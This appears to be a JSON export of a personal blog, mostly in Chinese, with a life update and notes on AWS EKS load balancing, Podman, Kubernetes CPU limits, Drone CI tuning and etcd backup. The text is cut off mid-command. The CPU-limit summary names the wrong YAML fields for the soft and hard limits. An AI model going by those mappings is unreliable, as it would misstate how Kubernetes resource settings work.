[{"title":"2025 Life Update","url":"/2025/04/12/","content":"\n## 近況\n\n距離上一篇文章更新已經超過兩年。前幾天剛好在 CloudFlare 上面調整 DNS Records 發現這個 blog 的每週解析數量還是有多達千人，因此我覺得需要更新一下近況讓長期有在專注該 blog 的各位知道本站目前的狀況。\n\n由於一下職涯上的長期考量，我從台北的 AWS 離職，現在正在北美尋找更多機會。而專注的事情也暫時從雲端基礎設施管理慢慢轉向 AI 工具如何幫助開發者更快完成目標。AI 的快速發展大幅縮短了開發產品所需要的時間，雖然雲端基礎設施領域還沒有向傳統開發領域一樣受到嚴重衝擊，但是可預見的將來這一天遲早會發生。而我也非常期待看到這一天的到來，到時候會有大量的新型態開發者有能力開發出各式各樣的軟體服務。\n\n從 2022 年工作之後我已經很少更新 blog 文章。原因除了接觸到的服務都是與 AWS EKS 有關以外，由於一些公司上的政策，寫太多技術細節可能或多或少會透漏到客戶的基礎設施架構。因此便很少進行文章更新。另外一點是工作之後，我很少在電腦上進行太多個人化設定以及鑽研其他底層技術（同樣因為公司政策）。\n\n然而到了北美之後原本以為會有時間繼續進行一些更新，但是由於找實習以及其他雜事花掉了我大量的時間以外。另外在北美找實習不外乎就是準備 Leetcode 刷題，而這個過程對於來說挺枯燥乏味，我也不知道應該寫些什麼來分享，至少我個人對於這個過程沒什麼熱情。只是為了拿 Offer 而去刷題。\n\n剛好 4 月是一個新學期的開始，找實習也到一個段落。我有更多時間可以專注在一些 AI 領域的想法上，以及用心去好好體驗在北美的生活。因此有了這一篇更新的誕生。\n\n若身為讀者你有想法或是一些疑問想要交流，歡迎直接聯絡我（你可以透過一些連結找到我的聯絡方式的）📧\n\n（以下是英文版本）\n\n## Life Update\n\nIt’s been more than two years since my last blog post. A few days ago, while I was updating some DNS records on Cloudflare, I noticed that this blog still gets thousands of DNS queries every week. That made me feel it’s time for an update — especially for those who’ve been following this blog for a while.\n\nFor long-term career reasons, I decided to leave AWS in Taipei and am now exploring new opportunities in North America. My focus has also shifted gradually — from managing cloud infrastructure to exploring how AI tools can help developers build faster and more efficiently. The rapid growth of AI has already shortened product development cycles a lot. While cloud infrastructure hasn’t been impacted as heavily as traditional software engineering (yet), it’s only a matter of time. I’m genuinely excited to see what the future holds — I believe many new types of developers will soon be able to create all kinds of software services with the help of AI.\n\nSince I started working in 2022, I’ve rarely updated this blog. One reason is that most of my work involved AWS EKS. Because of company policies, writing about technical details might accidentally expose parts of our clients’ infrastructure, so I avoided publishing too much. Another reason is that after starting full-time work, I rarely tinkered with my personal setup or explored low-level tech (again, mostly due to company rules).\n\nAfter moving to North America, I originally thought I’d have more time to write again. But job hunting — especially looking for internships — took up a lot of time. And to be honest, prepping for internships here mostly means grinding Leetcode. I find that process pretty dry and uninspiring, so I didn’t really know what to share. I was solving problems not out of interest, but just to get an offer.\n\nNow that it’s April — the start of a new academic term — and my internship search is mostly done, I finally have more time to focus on AI-related ideas and enjoy life here in North America. That’s what motivated me to write this update.\n\nIf you’re a reader and have any thoughts or questions you’d like to discuss, feel free to reach out to me directly (you can find my contact info through the links on this blog) 📧\n\n","tags":["life"]},{"title":"EKS ELB 獲取 Client IP 方法紀錄","url":"/2022/09/05/","content":"\n## 前言\n\n在 EKS 上要建立 ELB 會採用 service type 指定 LoadBalancer。此時 AWS 的 In-Tree LoadBalacner Controller 或是 [AWS Load Balancer Controller](https://github.com/kubernetes-sigs/aws-load-balancer-controller) 其中之一會協助我們建立對應的 ELB 出來。本文紀錄這兩種 LB Controller 的差異以及不同類型 ELB 使用時機（以獲取 Client IP 為例）。\n\n## In-Tree LoadBalacner Controller - CLB\n\n將 server type 指定成 `LoadBalancer` 此時 In-Tree LoadBalacner Controller 會 privosion 一個 CLB 出來\n\n流量從外部要進入叢集的路徑為\n\nCLB -> Node:NodePort -> Pod maybe in different node\n\n因為透過節點上的 NodePort 進行跳轉，所以 Pod 如果要獲得 Clinet IP 會拿到 Node 中的 IP。而獲取不到真正的 Client IP\n\n接著可以根據官方建議設定 `.spec.externalTrafficPolicy` 為 `Local`（預設為 `Cluster`）\n\n這樣的設定可以避免流量進入到沒有含 Destination Pod 的 Node 上，多做一個 hop 的跳轉，也避免 IP 被洗成該 Node 的 IP\n\n結果發現 Client IP 還是獲取不到，因為 CLB 在與後方的 instance 溝通時，是用該 subnet 介面的 IP 溝通，所以 Client IP 變成是 ELB 的 private IP（該 IP 可以從 ec2 的 network interfacae 找出來）\n\n現在的路徑變成\n\nCLB -> Node:NodePort （Pod also in the node）\n\n開啟了 `externalTrafficPolicy` 需不需要擔心如果該節點上沒有 Pod，進而請求沒有辦法路由到正確的位置上\n\n答案是不需要，因為 CLB 會對後方的 instance 做健康檢查，若後方 instance 沒有 Pod，那某該 instance 不健康，流量自然不會導入過去\n\n```\n優點：完全不需修改參數、不需安裝其他 controller\n缺點：無法保留 Client IP、不保留 Client IP 流量會多一跳、流量不平均（後面會提到）\n```\n\n## In-Tree LoadBalacner Controller - NLB\n\n需要在 annotations 加上\n\n```yaml\nannotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: \"nlb\"\n```\n\n並且我們將 `externalTrafficPolicy` 同樣設定成 `Local`\n\n發現就可以正常獲取 Client IP 了，代表 NLB 在轉發時，不會將 Source IP 介面切換成內網介面，同時後端也不是 instance 是另外一層抽象（target group）\n\n但試想一個一個情況，若我有 3 個 Pod (x, y, z)，2 個 (x, y) 落在節點 A，1 個 (z) 落在節點 B\n\n那麼流量進入 NLB 時會先進行 1/2 的機率選擇節點 (A, B)，假設進入節點 A 又會有 1/2 的機率選擇 x, y 這兩個 Pod\n\n那麼 Pod 被選中的機率變成\n\nx: 1/2 * 1/2 = 1/4\ny: 1/2 * 1/2 = 1/4\nz: 1/2\n\n可以發現流量並沒有真的平均轉發都後端的 Pod 上\n\n但 In-Tree Controller 只能建立出這兩種 ELB（並且能修改的參數有限），剩下一種 ALB 必須安裝 [AWS Load Balancer Controller](https://github.com/kubernetes-sigs/aws-load-balancer-controller)\n\n```\n優點：不需安裝其他 controller、可以保留 Client IP\n缺點：不保留 Client IP 流量會多一跳、流量不平均\n```\n\n## AWS Load Balancer Controller - NLB\n\n安裝 AWS Load Balancer Controller 後，在使用上必須指定 `loadBalancerClass: service.k8s.aws/nlb`\n\n並且 AWS Load Balancer Controller 有提供 `ip` 與 `instance` mode（使用 in-tree controller 建立出來的 mode 就是 instance mode）\n\n*該功能需要配合 AWS VPC CNI 使用*\n\n```\nannotations:\n    service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing\n    service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip\nspec:\n    loadBalancerClass: service.k8s.aws/nlb\n```\n\n此時會發現 NLB 後方的 target group 直接對應到 Pod IP，可以省去多一次跳轉，並且解決流量不平均的問題\n\n但 Client IP 還是沒有保留，我們可以調整 NLB 參數\n\n```\nannotations:\n    service.beta.kubernetes.io/aws-load-balancer-target-group-attributes: preserve_client_ip.enabled=true\n```\n\n將 NLB 提供的功能 preserve_client_ip 打開，即可完成配置，也不需要透過設定 `externalTrafficPolicy` 參數即可獲取 Client IP\n\n\n```\n優點：保留 Client IP、流量不會多一跳、流量平均\n缺點：需安裝其他 controller\n```\n\n## AWS Load Balancer Controller - ALB\n\n使用 Ingress 資源建立出 ALB，但是無法設定 `preserve_client_ip`\n\n如果去 management console 檢查對應 target group，會發現找不到 Preserve client IP addresses 但是多了 Load balancing algorithm 可以選擇\n\n\n因為是 L7 支援，所以將 Client IP 放入 HTTP header 的 XFF 欄位即可\n\n一樣有 `instance` 與 `ip` mode 可以選擇\n\n```\n優點：保留 Client IP（放在 L7 的 HTTP header 中）、流量不會多一跳、流量平均\n缺點：需安裝其他 controller\n```","tags":["AWS","EKS","ELB","Kubernetes"]},{"title":"建立 Reliable EKS 記錄","url":"/2022/08/30/","content":"\n## 前言\n\nEKS 的建立方便快速，其中有些概念花了些時間才釐清，甚至有些拓墣一開始想錯了。經過幾週查閱文件與實驗後，寫個小的總結做個簡單的紀錄。\n\n## Architecture\n\n- EKS 只有維護 Control Plane，Worker 有 EC2 與 Fargate 可以選擇。其中 EC2 必須由使用者自行管理。\n- EKS Control Plane 的 VPC 與 Cluster 的 VPC 為不同的 VPC\n- 如果 EKS 有開啟 Private Access，會在 Cluster VPC 的 subnet 中安插 EKS-managed ENI 讓 Cluster VPC 流量穿透至 EKS 中\n- EKS 建立時選擇的 VPC 是為了部署 EKS-managed ENI（最少兩個）使用\n- EKS-managed ENI 直接存在於 subnet 之中，非 EC2 instance（or 其他 instance）之上\n\n## Nodegroup\n\n如果 Nodegroup 完全無法存取外網，同時也就無法拉取必要的 Container Image，導致節點無法建立成功\n\nNodegroup 如果落在 private subnet，可以多開一台有 public subnet 的 EC2 作為 bastion 使用（同一個 VPC 下）\n\n## API Endpoint\n\n### public access\n\nAPI endpoint domain 會對應到一組 Public IP 做為 API Endpoint 入口\n\n可以使用 `kubectl cluster-info` 查看\n```\n[ec2-user@eks-bastion]$ kubectl cluster-info\nKubernetes control plane is running at https://<your api endpoint uuid>.gr7.<region>.eks.amazonaws.com\n```\n\n### private access\n\n根據[官方文件](https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html)描述，在 Cluster VPC 下會有 Route 53 private hosted zone 將 API endpoint 解析成該 VPC 下的 IP\n\n> This private hosted zone is managed by Amazon EKS, and it doesn't appear in your account's Route 53 resources.\n\n經過實驗會發現解出兩組 VPC 中的 private IP，同時為 EKS-managed ENI 的 IP\n\n這組介面可以透過將 Cluster VPC 的流量直接導向至 EKS VPC 之中\n\n啟用條件為 Cluster VPC 必須將 `enableDnsHostnames`, `enableDnsSupport` 設定為 `true`\n\n並且 `AmazonProvidedDNS` 要在 VPC DHCP 的 domain name servers list\n\n### public and private access\n\n外網因為沒有 Route 53 private hosted zone 所以會解析出外網 IP\n\nCluster VPC 下有 Route 53 private hosted zone 所以會解析出 EKS-managed ENI 的 IP\n\n## Pod Amount Limit\n\nPod limit 的根本問題是因為不同的 EC2 instance type 有先天的 VPC IP 數量限制\n\nENI 的數量有限制，每一個 ENI instance 可以指定的 IP 數量也有限制\n\n官方有給出一份計算後的限制列表可以進行查閱 [eni-max-pods.txt](https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt)\n\n突破限制前先釐清自己的叢集為何被限制，以下為幾種可能\n\n### limited by subnet CIDR\n\nsubnet 的 CIDR 一開始切太小，導致 Pod 數量超過 CIDR 範圍時，參考 VPC CNI 的 [AWS_VPC_K8S_CNI_CUSTOM_NETWORK_CFG](https://github.com/awslabs/amazon-eks-ami/blob/master/files/eni-max-pods.txt) 參數，來客製化 Pod 的 CIDR。\n\n### limited by EC2 instance type\n\n最常見的情況，達到 EC2 上的 IP 數量限制，因此 VPC CNI 無法成功索取 IP。\n\n方法一：\n\n直接抽換 AWS VPC CNI，換掉之後 Node 就不會再持續索取 secondary private IPv4 addresses，不過抽換後，沒有辦法讓 Pod 的 IP 直接屬於 VPC 下的 IP（理論效能會差一些，流量可能須經過 NAT 轉換）。\n\n方法二：\n\n使用 2021 年 EC2 新推出的功能 `prefix assignment`。開啟 AWS VPC CNI 中的 `ENABLE_PREFIX_DELEGATION` 參數。將每一個 ENI 上原本可以附加的 secondary private IPv4 addresses 變成變為 /28 範圍（16 個 IPs）。\n\n參考 [Increase the amount of available IP addresses for your Amazon EC2 nodes\n](https://docs.aws.amazon.com/eks/latest/userguide/cni-increase-ip-addresses.html)\n\n### limited by insufficient IP's\n\n該 subnet 下的 IP 被其他節點或是其他應用索取完畢，導致某些節點的 `aws-node` (VPC CNI) 沒有辦法正常索取 IP。解決方法為設定 `WARM_ENI_TARGET` 與 `WARM_IP_TARGET` 參數，來讓剛節點一被部署時就預先保留好可用的 IP，即時當時 Pod 還沒有被建立。\n\n## Customize kubelet Arguments\n\n某些時候需要客製化我們的節點，例如修改 container runtime（EKS 1.23 已經將預設 container runtime 換成 containerd）\n\nAmazon EKS optimized Amazon Linux AMI 在開機時會呼叫 `/etc/eks/bootstrap.sh` 在執行必要的初始化\n\n然而該腳本就有提供參數可供調整，例如我想要替換 container runtime 可以在 launch template 中改寫 user-data 成\n\n```shell\n#!/bin/bash\n/etc/eks/bootstrap.sh demo-k8s --container-runtime containerd\n```\n\n想要修改 kubelet 的啟動參數可以用 `--kubelet-extra-args` 來修改\n\n## 後記\n\n以上為這幾週第一次使用 EKS 的紀錄以及個人認為比較容易混淆或是模糊的點，要建構一個可信賴的 EKS 要考量的內容五花八門。這還只是一些在架構上的概念釐清而已，如果要往叢集內部鑽研，有更多要注意與可以調教的地方。這篇文章同時也給以後的自己參考，未來有機會再寫其他文章探討不同層面需要考量的議題。\n","tags":["AWS","EKS","Kubernetes"]},{"title":"在 macOS 上使用 Podman","url":"/2022/07/07/","content":"\n## 前言\n\nPodman 相較於 Docker 有許多優勢，本文為在 macOS 上初次使用 Podman 之簡短紀錄。過程中不探究太深入的 Podman  運作原理，單純依照一般運行 container 的思想來使用 Podman，看看會遇到什麼問題\n\n## 安裝\n\nPodman 與 Docker 一樣有桌面版本與非桌面版本，桌面版本多了 UI 可供查看，挑選一種喜歡的安裝即可\n\n桌面版：\n\n`brew install podman-desktop`\n\n非桌面版：\n\n`brew install podman`\n\n檢查安裝版本：\n\n`podman version`\n\n```\nCannot connect to Podman. Please verify your connection to the Linux system using `podman system connection list`, or try `podman machine init` and `podman machine start` to manage a new Linux VM\nError: unable to connect to Podman. failed to create sshClient: Connection to bastion host (ssh://core@localhost:52568/run/user/1000/podman/podman.sock) failed.: dial tcp [::1]:52568: connect: connection refused\n```\n\n馬上遇到第一個問題，按照提示使用 `podman machine init` 來建立 Linux VM，運作原理猜測與 Docker on macOS  類似，不過 Docker Desktop 不用手動建立 VM\n\n檢查是否有啟動 podman 需要的 VM：\n\n`podman machine list`\n\n```\nNAME                     VM TYPE     CREATED         LAST UP        CPUS        MEMORY      DISK SIZE\npodman-machine-default*  qemu        37 minutes ago  3 minutes ago  1           2.147GB     10.74GB\n```\n\n可以看到 VM 已經被正確啟動（而且是使用 qemu 來啟動的），但依照報一樣的錯誤。後來查了 [issue#12728](https://github.com/containers/podman/issues/12728) 發現 Podman 嘗試使用 $SSH_AUTH_SOCK 變數設定的 address 來連線，可以取消設置該變數來解決該問題\n\n```\nunset SSH_AUTH_SOCK\n```\n\n（請依照你的 shell 放置到對應的檔案中）\n\n接下來就可以看到 Podman 的版本資訊：\n\n```\nClient:\nVersion:      3.4.1\nAPI Version:  3.4.1\nGo Version:   go1.17.2\nBuilt:        Wed Oct 20 05:14:42 2021\nOS/Arch:      darwin/amd64\n\nServer:\nVersion:      4.1.1\nAPI Version:  4.1.1\nGo Version:   go1.18.3\nBuilt:        Wed Jun 15 22:31:58 2022\nOS/Arch:      linux/amd64\n```\n\n## 使用\n\n搜尋 Image：\n\n`podman search busybox`\n\n依照 output 可以發現預設是去搜尋 docker hub (hub.docker.com)\n```\nINDEX       NAME                                         DESCRIPTION                                                                                STARS       OFFICIAL    AUTOMATED\ndocker.io   docker.io/library/busybox                    Busybox base image.                                                                        2660        [OK]\ndocker.io   docker.io/rancher/busybox                                                                                                               0\ndocker.io   docker.io/ibmcom/busybox                                                                                                                0\n......\n```\n\n下載 Image 到本地：\n\n`podman pull busybox`\n\n執行 busybox image：\n\n```\npodman run -it --rm busybox\n/ #\n/ #\n/ #\n/ # exit\n```\n\n使用起來與 Docker 並無二異\n\n## 發現\n\n### registries 設定檔案\n\n故意拉一個不存在的 image\n\n`podman pull this-is-error`\n\n```\nResolving \"this-is-error\" using unqualified-search registries (/etc/containers/registries.conf.d/999-podman-machine.conf)\n```\n\n會發現 podman 透過 `/etc/containers/registries.conf.d/999-podman-machine.conf` 設定來決定完整的 Image 名稱（因為沒有指定 registry 理論上無法定位該 Image 位置）\n\n到 VM 中檢查一下該檔案，就可以發現原來是預設找不到 image 就去 `docker.io` 找\n\n```\n❯ podman machine ssh\nConnecting to vm podman-machine-default. To close connection, use `~.` or `exit`\nWarning: Permanently added '[localhost.nctu.edu.tw]:52568' (ED25519) to the list of known hosts.\nFedora CoreOS 36.20220703.2.1\nTracker: https://github.com/coreos/fedora-coreos-tracker\nDiscuss: https://discussion.fedoraproject.org/tag/coreos\n\nLast login: Thu Jul  7 01:50:15 2022 from 192.168.127.1\n[core@localhost ~]$ cat /etc/containers/registries.conf.d/999-podman-machine.conf\nunqualified-search-registries=[\"docker.io\"]\n[core@localhost ~]$\n```\n\n另外也發現其他 registries 的設定檔\n\n```\n[core@localhost containers]$ cd /etc/containers/registries.conf.d\n[core@localhost registries.conf.d]$ ls\n000-shortnames.conf  999-podman-machine.conf\n[core@localhost registries.conf.d]$ cat 000-shortnames.conf\n[aliases]\n  # almalinux\n  \"almalinux\" = \"docker.io/library/almalinux\"\n  \"almalinux-minimal\" = \"docker.io/library/almalinux-minimal\"\n  # Arch Linux\n  \"archlinux\" = \"docker.io/archlinux/archlinux\"\n  # centos\n  \"centos\" = \"quay.io/centos/centos\"\n  # containers\n  \"skopeo\" = \"quay.io/skopeo/stable\"\n  \"buildah\" = \"quay.io/buildah/stable\"\n  \"podman\" = \"quay.io/podman/stable\"\n  \"hello\" = \"quay.io/podman/hello\"\n  \"hello-world\" = \"quay.io/podman/hello\"\n  # docker\n  \"alpine\" = \"docker.io/library/alpine\"\n  \"docker\" = \"docker.io/library/docker\"\n  \"registry\" = \"docker.io/library/registry\"\n  \"swarm\" = \"docker.io/library/swarm\"\n```\n\n可以發現原來有些 image 是透過 alias 的方式來決定位置的\n\n### Port Forward 顯示不正常\n\n```\n❯ podman run -itd -p 8888:80 nginx\nbe5cb3e60f7b714e3b9c3462610675dd8cc7eaf0c048cdef7c3c8ea011979096\n\n❯ podman run -itd -P nginx\n9a2adbd0e86c0083ad0af5bccedc7f5dbaa3b64599c982368f8e64b301eac25d\n\n❯ podman ps\nCONTAINER ID  IMAGE                           COMMAND               CREATED         STATUS             PORTS             NAMES\nbe5cb3e60f7b  docker.io/library/nginx:latest  nginx -g daemon o...  17 seconds ago  Up 18 seconds ago  0.0.0.0:0->0/tcp  unruffled_bouman\n9a2adbd0e86c  docker.io/library/nginx:latest  nginx -g daemon o...  3 seconds ago   Up 4 seconds ago   0.0.0.0:0->0/tcp  laughing_wiles\n```\n\n在 `podman ps` 中看不到被 binding 出來的 Ports 有些不方便\n\n不過透過 `podman inspect` 還是找得出來\n\n```\n❯ podman inspect be5cb3e60f7b | grep -A5 \"PortBindings\"\n            \"PortBindings\": {\n                \"80/tcp\": [\n                    {\n                        \"HostIp\": \"\",\n                        \"HostPort\": \"8888\"\n                    }\n\n❯ podman inspect 9a2adbd0e86c | grep -A5 \"PortBindings\"\n            \"PortBindings\": {\n                \"80/tcp\": [\n                    {\n                        \"HostIp\": \"\",\n                        \"HostPort\": \"45521\"\n                    }\n```\n\n至於一些複雜的用法暫時還沒有測試過，也不確定差異是否很大\n\n我想最大的差異可能還是會在 networking 的部分，Podman 官方也有給出[一頁介紹](https://github.com/containers/podman/blob/main/docs/tutorials/basic_networking.md)來說明 Podman 的網路架構\n\n這部分就等到有時間研究完之後再來補上使用心得了 😅\n\n","tags":["podman","container"]},{"title":"理解 Kubernetes 中的 CPU Limit","url":"/2021/12/13/","content":"\n\n## TL;DR\n\nKubernetes 中的資源限制目前可以對兩種資源做限制，分別為 `cpu`（可壓縮資源）, `memory`（不可壓縮資源）。針對這兩種資源的限制可以對應到兩種限制，分別為 Soft Limit（request）與 Hard Limit（limit）\n\ncgroup 對於這兩種資源達到 Hard Limit 的處理並不相同。記憶體超出 Hard Limit 會觸發 OOM；CPU 超出 Hard Limit 則是會造成 CPU Throttling（程式並不會被終止）\n\n在 Cgroup 中使用針對 K8s Pod yaml 所定義之 Soft Limit：\n\n```\nspec.containers[].resources.requests.memory\n```\n\n會讓 Cgroup 設定系統之 `cpu.shares` 參數\n\n而 Hard Limit：\n\n```\nspec.containers[].resources.requests.cpu\n```\n\n會讓 Cgroup 設定系統之 `cpu.cfs_period_us`, `cpu.cfs_quota_us` 參數\n\n## cpu.shares\n\n當我們在 Pod 之 yaml 中定義 `spec.containers[].resources.requests.cpu`：\n\n```yaml\nspec:\n  containers:\n  - name: busybox\n    image: hwchiu/netutils\n    args:\n    - sleep\n    - infinity\n    resources:\n      requests:\n        cpu: \"500m\"\n```\n\n可以從對應節點的路徑發現各種 cgroup 參數\n\n`/sys/fs/cgroup/cpu,cpuacct/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod<Pod-uid>.slice`\n\n(因為只有設定 request 所以是進入 burstable 目錄，關於 Pod QoS 可以參考 Kubernetes 官方文件)\n\n此時可以發現\n\n檔案：cpu.cfs_quota_us 的內容為 `-1`（因為沒有設定 Hard Limit，-1 代表不受限制），而 cpu.shares 的內容為 `512`（與設定的 500m 不相同是因為 cgroup 以 1024 為底，yaml 以 1000 為底）\n\n而這個 512 會讓該 Pod（以下稱為 Pod A）具有\n\n512 / (512 + Other Pod cpu.shares) 的 CPU 使用時間\n\n假設叢集中只有兩個 Pod，另外一個 Pod 的 cpu.shares 為 1024\n\n則 Pod A 的使用時間有\n\n512/(512 + 1024) = 33%\n\n這種相對的設定方式很明顯的可以發現並沒有辦法實質控制 Pod 在 CPU 的時間分配\n\n## cpu.cfs_quota_us\n\n然而如果設定的 Pod yaml 為：\n\n```yaml\n    resources:\n      requests:\n        cpu: \"500m\"\n      limits:\n        cpu: \"900m\"\n```\n\n可以發現 cpu.cfs_period_us 的值為 `100000`，以及 cpu.cfs_quota_us 的值為 `90000`\n\n100000 的含義代表 CPU 一個週期，也就是 1/10 秒（100000 微秒）\n\n90000 代表在這個週期內，該 Pod 最高可以使用的時間為 90000 微秒，也就是 yaml 中設定的 900m\n\n換句說話，如果我們要讓 Pod 在一個 CPU 週期可以完全跑滿，那就要設定 1000m\n\n如果使用到上限，程式還沒結束，該 CPU 週期內的該程式就會被 Throttling，留到下一個週期才能繼續執行\n\n但是一但設定了 Hard Limit 同時代表系統上的 CPU 不忙碌，該 Pod 也無法使用更多的 CPU 時間\n\n## 參考資料\n\n- [Throttling: New Developments in Application Performance with CPU Limits - Dave Chiluk, Indeed](https://www.youtube.com/watch?v=UE7QX98-kO0)\n- [k8s CPU limit 和 throttling 的迷思](https://zhuanlan.zhihu.com/p/433065108)","tags":["Kubernetes","cgroup"]},{"title":"一次 CI/CD 調教經驗","url":"/2021/11/07/","content":"\n## 前言\n\n最近受朋友委託，協助改善了一個現有的 CI/CD Pipeline 流程。對方的專案主要是一群熟悉軟體的設計的開發者所開發，但團隊中並沒有人對於維護 Pipeline 有相關經驗，於是我接下任務，一方面也想看一下在調教前與調教之後可以得到多大的效益提升。對於一個沒有開發該專案的人來說，最快了解專案整體的整合與部署流程的方式就是直接去看現有的 Pipeline。於是我打算從檢視 Pipeline 開始下手，看有哪些地方可以改良。\n\n## Runner 的選擇\n\n對方當時為了快速將 Pipeline 搭建上線，所以在選擇 Runner 的時候選擇了一個最快速（但可能不安全）的 Runner，也就是 Exec Runner（對方採用的 CI 工具為 Drone CI ）。然而因為移植性的關係，我們都會希望自己的 Pipeline 環境可以跑在容器之中，方便後續的遷移以及不耦合於特定作業系統。於是我將對方伺服器上的 Runner 重新架設了 Docker Runner，並且將原有的 `.drone.yml` 設定檔由 Exec Runner 形式轉換成 Docker Runner，結果馬上遇到了第一個問題\n\n> 原本的 CI 整合測試的時間由 2 分鐘直接變成了 8 分鐘。\n\n經過後續的排查才發現原來對方的 Exec Runner 在執行 Maven 打包時，因為是直接在作業系統上開啟 Process 來處理，所以每一次執行都是一樣的環境，造成後續進行打包的時候都是共用 `/root/.m2/repository` 裡面的套件，造成每一次 CI 其實都在快取之前用過的套件，並不是完全乾淨的環境。若使用 Docker Runner，也想要類似的快取行為，就只能透過共享特定 host 上的目錄來達成，在 DroneCI 中此類的設定也是非常好撰寫。\n\n## Docker in Docker\n\n接下來這個問題幾乎是所有 CI/CD 平台 的 Docker Runner 都會遇到的問題。如何在 CI/CD Stage 中使用 Docker 指令來建構 Docker Image？這個問題的解法大致上可分為兩種（DinD 與 DooD）。然而最快的方法是直接將 `/var/run/docker.sock` 掛載於 Stage 的 Container 中，來達到可以在容器之中透過 UNIX Sock 與 host 上的 Docker Engine 溝通（當然還要有 docker cli）。實際上在執行 Pipeline 時，發現在對方專案中的 testcontainer 在進行整合測試時，嘗試去連線自己（Maven 中的 testcontainer）所建立出來 testcontainers/ryuk 容器，並且因為無法正常連線至該容器而導致錯誤。後來查看了系統環境才發現對方 Runner 的機器上使用 ufw 去管理防火牆\n\n> ufw 會將 iptables 中的 INPUT chain (filter table) Policy 改成 DROP\n\n造成 Drone CI Stage 中的 Container 無法正常存取其他 Container，主要因為 Drone CI 因為安全原因所以將這些 Stage 開出來的 Container 都放在獨立的 Linux Bridge 之下，而不是預設的 docker0，這時候跨介面的通訊會因為 iptables 規則而被擋下（當時 ufw 為開啟狀態）。\n\n## latest tag 造成的隱含行為\n\n將 Pipeline 整理得差不多時，發現在 CD 階段時的基礎設施都是用 docker-compose 執行，可是這些 Image 並沒有指定 Image tag（預設採用 latest）。於是使用了 docker images 指令發現這些 Image 都是在數個月之前被拉到本地端的，無法得知當時版本，也就沒辦法指定特定版本來維持專案的移植性。使用 Image 的 id 在 docker hub 上面搜尋可能是一個辦法，但是 docker hub 並沒有提供讓用戶直接用 Image id 來搜尋的方式。在網路上找了一些工具也沒有解決想知道這些 Image 到底是哪一個版本的問題。在最後使用 docker inspect 時無意間看到\n\n> ContainerConfig 欄位，其中的 Env 欄位中有應用程式的版本資訊\n\n雖然沒有辦法完全知道 Image 的 tag，但是知道 Image 中應用程式的版本也可以方便使用這些版本來進行測試，測試沒問題後就將這些版本都固定，避免日後轉移時因為 latest 標籤而無法確定版本\b。\n\n## 後記\n\n這篇為這幾天最佳化 Pipeline 後的紀錄小總結，在將這些初步的最佳化完成之後。之後則會進行一些設計方向的最佳化，包含\n\n- 如何規劃快取才可以加速流程但不希望因此而造成測試不乾淨\n- 如何設計一個可以在 monorepo 的專案中，不用因為改了 A，就將全部的微服務（A, B, C）重新打包\n- 使否需要一個儲存敏感資訊的區域，讓多個 Runner 在部署時可以去拉取資訊（而不透過 host 共享檔案）\n","tags":["CI/CD","Docker","DroneCI"]},{"title":"如何備份 Kubernetes 中的 etcd","url":"/2021/05/21/","content":"\n## 序言\n\nKubernetes 中的狀態都是用 etcd 這套 key-value 儲存工具來維持，也就是說我們只要備份好 etcd 後，就可以很輕易的重建一個一模一樣的 Cluster 起來。\n\n要備份 etcd 可以使用 etcdctl 這套 cli 工具來簡單完成\n\n因為 etcd 分了 v2, v3 兩種版本，彼此不相容，所以在使用 cli 工具時需要指定版本\n\n在操作時，我們會需要 cert 位置與 key 的位置，如果你的 Cluster 是透過 kubeadm 安裝，那麼位置都會在 `/etc/kubernetes/pki/etcd` 中\n\n我們可以先透過 `etcdctl member list` 來確認是否可以正確連線到我們的 etcd\n\n以下都假設我的 etcd 位置在 `10.10.10.10`\n\n\n```shell\nETCDCTL_API=3 etcdctl member list \\\n--endpoints https://10.10.10.10:2379 \\\n--cert=/etc/kubernetes/pki/etcd/server.crt \\\n--key=/etc/kubernetes/pki/etcd/server.key \\\n--insecure-skip-tls-verify\n```\n\n如果覺得指令太長的話，etcdctl 預設會去吃環境變數，也可以在環境變數中設定\n\n```\nexport ETCDCTL_CERT_FILE='/etc/kubernetes/pki/etcd/server.crt'\nexport ETCDCTL_KEY_FILE='/etc/kubernetes/pki/etcd/server.key'\nexport ETCDCTL_ENDPOINTS='https://10.10.10.10:2379'\n```\n\n不確定這些資訊在哪裡的話，可以直接去看你 etcd 的 yaml 就可以看到了，這些資訊會在 etcd 的啟動參數中\n\n## 匯出\n\n確認可以連線之後，我們將 etcd 的內容完整的匯出，命名為 `etcd-snapshot-$(date +%Y%m%d).db`\n\n```shell\nETCDCTL_API=3 etcdctl snapshot save /root/etcd-snapshot-$(date +%Y%m%d).db \\\n--endpoints https://10.10.10.10:2379 \\\n--cert=/etc/kubernetes/pki/etcd/server.crt \\\n--key=/etc/kubernetes/pki/etcd/server.key \\\n--insecure-skip-tls-verify\n```\n\noutput:\n```\nSnapshot saved at /root/etcd-snapshot-20210521.db\n```\n\n## 匯入\n\n匯出相較匯出麻煩一些，我們需要先讓 api-server 與 etcd 都終止，重新將 etcd 的資料匯入之後再重新打開它們。\n\n我的 api-server 與 etcd 都是以 static pod 的方式存在，所以只要將對應的 yaml 檔案暫時移除 static pod 目錄即可\n\n```shell\nmv /etc/kubernetes/manifests/etcd.yaml /root/etcd.yaml\nmv /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml\n```\n\n接著我們將舊的 etcd 資料暫時移開（同時進行備份）\n\n```shell\nmv /var/lib/etcd/default.etcd /var/lib/etcd/default.etcd.bak\n```\n\n將新的剛才匯出的 etcd 資料重新匯入\n\n```shell\nETCDCTL_API=3 etcdctl snapshot restore /root/etcd-snapshot-20210521.db \\\n--name etcd-0 \\\n--initial-cluster \"etcd-0=https://10.10.10.10:2380\" \\\n--initial-cluster-token etcd-cluster \\\n--initial-advertise-peer-urls https://10.10.10.10:2380 \\\n--data-dir=/var/lib/etcd/default.etcd\n```\noutput:\n```\n2021-05-21 07:42:36.826573 I | mvcc: restore compact to 3969180\n2021-05-21 07:42:36.840090 I | etcdserver/membership: added member 9ce23f330769428b [https://10.10.10.10:2380] to cluster 457ee8b0c2eda630\n```\n\n匯出之後再把 api-server 與 etcd 重啟就可以了\n\n```\nmv /root/etcd.yaml /etc/kubernetes/manifests/etcd.yaml\nmv /root/kube-apiserver.yaml 